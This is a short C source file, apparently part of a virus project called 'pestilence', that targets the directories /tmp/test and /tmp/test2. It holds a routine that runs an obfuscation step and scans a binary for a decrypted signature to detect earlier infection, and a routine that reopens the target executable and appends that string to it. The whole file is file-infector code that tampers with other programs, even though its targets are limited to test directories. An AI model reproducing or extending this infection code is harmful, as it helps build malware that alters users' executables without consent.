#define _GNU_SOURCE

#include "../incl/pestilence.h"

char    *ft_getdir(int i)
{
    if (i == 0)
        return ("/tmp/test");
    else
        return ("/tmp/test2");
}

int     ft_detect_prev_infection(t_pestilence *pestilence)
{
    ft_obfuscation(pestilence);
    pestilence->signd = memmem(pestilence->elf, pestilence->file_size, pestilence->decrypted, strlen(pestilence->decrypted));
    if (pestilence->signd)
        return (0);
    else
        return (1);
}

void    ft_infect(t_pestilence *pestilence)
{
    munmap(pestilence->elf, pestilence->file_size);
    close(pestilence->fd);
    pestilence->fd = open(pestilence->binary, O_WRONLY | O_NOFOLLOW);
    if (pestilence->fd == -1)
        return;
    lseek(pestilence->fd, 0, SEEK_END);
    write(pestilence->fd, pestilence->decrypted, strlen(pestilence->decrypted));
    close(pestilence->fd);
}